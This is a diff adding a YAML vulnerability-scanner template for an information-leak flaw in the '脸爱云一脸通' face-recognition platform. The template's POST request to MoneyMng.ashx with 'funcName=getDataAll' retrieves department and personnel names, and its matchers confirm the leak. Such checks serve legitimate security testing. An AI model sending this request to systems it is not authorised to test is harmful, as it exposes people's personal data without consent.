@@ -1,0 +1,30 @@
+id: poc-yaml-lian-ai-yun-moneymng-info-leak
+info:
+  name: 脸爱云一脸通智慧平台 MoneyMng 信息泄露漏洞
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: 信息泄露
+  description: |
+    脸爱云一脸通智慧平台 MoneyMng 信息泄露漏洞 allows attackers to retrieve sensitive information through the exposed endpoint.
+
+http:
+  - method: POST
+    path:
+      - '{{BaseURL}}/MoneyMng.ashx'
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: 'funcName=getDataAll'
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "getRyxx"
+        part: body
+      - type: regex
+        regex:
+          - '\\"bmmc\\":\\"[\\u4e00-\\u9fa50-9]+\\"'
+          - '\\"ryxm\\":\\"[\\u4e00-\\u9fa5]+\\"'
+        part: body
